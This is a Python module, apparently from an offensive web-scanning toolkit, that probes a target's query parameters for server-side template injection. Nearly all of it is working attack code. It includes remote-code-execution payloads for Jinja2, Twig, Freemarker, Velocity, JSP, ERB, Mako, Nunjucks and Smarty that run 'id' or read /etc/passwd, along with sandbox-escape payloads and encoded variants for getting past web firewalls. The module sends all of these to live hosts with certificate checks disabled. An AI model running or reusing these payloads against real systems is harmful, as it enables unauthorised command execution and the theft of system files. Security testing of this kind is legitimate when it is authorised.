"""Deep SSTI detection — multi-engine payloads, RCE confirmation, sandbox detection."""

import httpx
import re
import urllib.parse
import asyncio

# --- Template Engine Detection Payloads ---
DETECTION_PAYLOADS = [
    # Math-based detection (works on most engines)
    ("math_jinja2", "{{7*7}}", ["49"], "Jinja2/Twig/Python"),
    ("math_django", "{{ 7|add:7 }}", ["14"], "Django Template"),
    ("mathTwig", "{{7*7}}", ["49"], "Twig"),
    ("math_freemarker", "<#assign x=7*7>${x}", ["49"], "Freemarker"),
    ("math_velocity", "#set($x=7*7)$x", ["49"], "Velocity"),
    ("math_mako", "${7*7}", ["49"], "Mako/Python"),
    ("math_ruby", "<%= 7*7 %>", ["49"], "ERB/Ruby"),
    ("math_handlebars", "{{7*7}}", ["49"], "Handlebars"),
    ("math_marko", "${7*7}", ["49"], "Marko"),
    ("math_nunjucks", "{{7*7}}", ["49"], "Nunjucks"),
    ("math_pug", "#{7*7}", ["49"], "Pug/Jade"),
    ("math_ejs", "<%= 7*7 %>", ["49"], "EJS"),
    ("math_jsp", "${7*7}", ["49"], "JSP/EL"),
    ("math_smarty", "{7*7}", ["49"], "Smarty"),
    ("math_twig2", "{{ 7 * 7 }}", ["49"], "Twig v2"),
    ("math_jinja2_env", "{{ config.items() }}", ["config", "items"], "Jinja2 (env leak)"),
    ("math_jinja2_init", "{{ ''.__class__.__mro__[2].__subclasses__() }}", ["subclasses"], "Jinja2 (class walk)"),
]

# --- RCE Confirmation Payloads ---
RCE_PAYLOADS = [
    # Jinja2/Python
    ("jinja2_os_system", "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}", "root:", "Jinja2 RCE via class walk"),
    ("jinja2_import_os", "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}", "uid=", "Jinja2 RCE via os import"),
    ("jinja2_builtins", "{{ lipsum.__globals__['os'].popen('id').read() }}", "uid=", "Jinja2 RCE via lipsum"),
    ("jinja2_cycler", "{{ cycler.__init__.__globals__.os.popen('id').read() }}", "uid=", "Jinja2 RCE via cycler"),
    ("jinja2_joiner", "{{ joiner.__init__.__globals__.os.popen('id').read() }}", "uid=", "Jinja2 RCE via joiner"),
    ("jinja2_namespace", "{{ namespace.__init__.__globals__.os.popen('id').read() }}", "uid=", "Jinja2 RCE via namespace"),

    # Twig/PHP
    ("twig_exec", "{{['id']|filter('system')}}", "uid=", "Twig RCE via filter"),
    ("twig_exec2", "{{['cat /etc/passwd']|filter('system')}}", "root:", "Twig RCE via filter (file read)"),

    # Freemarker
    ("freemarker_assign", "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", "uid=", "Freemarker RCE via Execute"),
    ("freemarker_objectconstructor", "<#assign classloader=objectConstructor('java.lang.ClassLoader').getSystemClassLoader()>", "", "Freemarker classloader access"),

    # Velocity
    ("velocity_classloader", "#set($class=$class.inspect('java.lang.Runtime').runtime.exec('id'))", "uid=", "Velocity RCE via Runtime"),
    ("velocity_process", "#set($proc=$processBuilder('id').start())#set($input=$proc.getInputStream())", "", "Velocity RCE via ProcessBuilder"),

    # JSP/EL
    ("jsp_runtime", "${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}", "uid=", "JSP RCE via Runtime"),
    ("jsp_processbuilder", "${T(java.lang.Runtime).getRuntime().exec('id')}", "uid=", "JSP RCE via Runtime.exec"),

    # ERB/Ruby
    ("erb_exec", "<%= system('id') %>", "uid=", "ERB RCE via system"),
    ("erb_exec2", "<%= `id` %>", "uid=", "ERB RCE via backticks"),

    # Mako/Python
    ("mako_import", "<%import os%>${os.popen('id').read()}", "uid=", "Mako RCE via os import"),

    # Nunjucks
    ("nunjucks_rce", "{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}", "uid=", "Nunjucks RCE via constructor"),

    # Smarty
    ("smarty_php", "{system('id')}", "uid=", "Smarty RCE via system"),
    ("smarty_exec", "{ Smarty_Internal_Write_File::writeFile($this->smarty->compile_dir.'<?php system(\"id\");?>') }", "", "Smarty RCE via file write"),
]

# --- Sandbox Escape Payloads ---
SANDBOX_PAYLOADS = [
    ("jinja2_mro", "{{ ''.__class__.__mro__[1].__subclasses__() }}", "subclasses", "Jinja2 MRO walk"),
    ("jinja2_globals", "{{ config.__class__.__init__.__globals__ }}", "os", "Jinja2 config globals"),
    ("jinja2_builtins_leak", "{{ lipsum.__globals__ }}", "os", "Jinja2 lipsum globals"),
    ("freemarker_explorer", "<#assign classloader=objectConstructor('java.net.URLClassLoader')[]>", "", "Freemarker classloader"),
    ("velocity_utils", "#set($arr=$class.inspect('java.lang.String[]').newInstance())", "", "Velocity class inspection"),
]

# --- Encoding Bypass ---
def _encode_payload(payload: str) -> list[str]:
    """Generate encoded variants of SSTI payload."""
    variants = [payload]

    # URL encoding
    variants.append(urllib.parse.quote(payload, safe=""))

    # Double URL encoding
    variants.append(urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""))

    # HTML entity encoding
    html_encoded = "".join(f"&#{ord(c)};" for c in payload)
    variants.append(html_encoded)

    # Unicode encoding
    unicode_encoded = "".join(f"\\u{ord(c):04x}" for c in payload)
    variants.append(unicode_encoded)

    # Mixed case
    mixed = payload.replace("{{", "{%").replace("}}", "%}")
    if mixed != payload:
        variants.append(mixed)

    return list(set(variants))


async def ssti_detect(target: str, param: str = "") -> dict:
    """Deep SSTI detection with multi-engine payloads, RCE confirmation, and sandbox detection."""
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    parsed = urllib.parse.urlparse(target)
    params = urllib.parse.parse_qs(parsed.query)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    test_params = [param] if param else list(params.keys()) if params else [
        "name", "msg", "user", "input", "q", "search", "query", "text",
        "template", "page", "content", "data", "body", "message",
        "title", "comment", "feedback", "review", "description",
        "first_name", "last_name", "email", "subject", "greeting",
    ]

    results = []
    detected_engine = None
    working_param = None

    async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=False) as client:
        # Get baseline
        try:
            baseline_resp = await client.get(base)
            baseline_len = len(baseline_resp.text)
        except Exception:
            baseline_len = 0

        for p in test_params:
            if working_param and working_param != p:
                continue

            # --- Engine Detection ---
            for payload_name, payload, expected, engine_hint in DETECTION_PAYLOADS:
                try:
                    url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                    resp = await client.get(url)
                    body = resp.text

                    found = [e for e in expected if e in body]
                    if found:
                        results.append({
                            "technique": "engine_detection",
                            "param": p,
                            "payload": payload_name,
                            "payload_value": payload[:100],
                            "engine_hint": engine_hint,
                            "matched": found,
                            "status": resp.status_code,
                            "risk": "HIGH",
                            "confidence": "high",
                        })
                        detected_engine = engine_hint
                        working_param = p
                        break
                except Exception:
                    continue

            # --- RCE Confirmation ---
            if working_param == p:
                for payload_name, payload, indicator, description in RCE_PAYLOADS:
                    try:
                        url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                        resp = await client.get(url)
                        body = resp.text

                        if indicator and indicator in body:
                            results.append({
                                "technique": "rce_confirmed",
                                "param": p,
                                "payload": payload_name,
                                "payload_value": payload[:100],
                                "indicator": indicator,
                                "evidence": body[:300],
                                "description": description,
                                "status": resp.status_code,
                                "risk": "CRITICAL",
                                "confidence": "confirmed",
                            })
                            break
                    except Exception:
                        continue

            # --- Sandbox Escape Test ---
            if working_param == p:
                for payload_name, payload, indicator, description in SANDBOX_PAYLOADS:
                    try:
                        url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                        resp = await client.get(url)
                        body = resp.text

                        if indicator and indicator in body:
                            results.append({
                                "technique": "sandbox_escape",
                                "param": p,
                                "payload": payload_name,
                                "indicator": indicator,
                                "description": description,
                                "evidence": body[:200],
                                "status": resp.status_code,
                                "risk": "CRITICAL",
                                "confidence": "high",
                            })
                            break
                    except Exception:
                        continue

            # --- WAF Bypass ---
            if not working_param:
                for payload_name, payload, expected, engine_hint in DETECTION_PAYLOADS[:5]:
                    for variant in _encode_payload(payload)[:3]:
                        try:
                            url = f"{base}?{p}={variant}"
                            resp = await client.get(url)
                            body = resp.text

                            found = [e for e in expected if e in body]
                            if found:
                                results.append({
                                    "technique": "waf_bypass_ssti",
                                    "param": p,
                                    "payload": payload_name,
                                    "original": payload,
                                    "encoded": variant[:100],
                                    "engine_hint": engine_hint,
                                    "matched": found,
                                    "risk": "CRITICAL",
                                    "confidence": "high",
                                })
                                detected_engine = engine_hint
                                working_param = p
                                break
                        except Exception:
                            continue
                    if working_param == p:
                        break

    return {
        "target": target,
        "params_tested": test_params,
        "detected_engine": detected_engine,
        "working_param": working_param,
        "results": results,
        "vulnerable": len(results) > 0,
        "total_findings": len(results),
        "techniques_found": list(set(r["technique"] for r in results)),
        "risk_summary": {
            "critical": sum(1 for r in results if r.get("risk") == "CRITICAL"),
            "high": sum(1 for r in results if r.get("risk") == "HIGH"),
            "medium": sum(1 for r in results if r.get("risk") == "MEDIUM"),
        },
    }
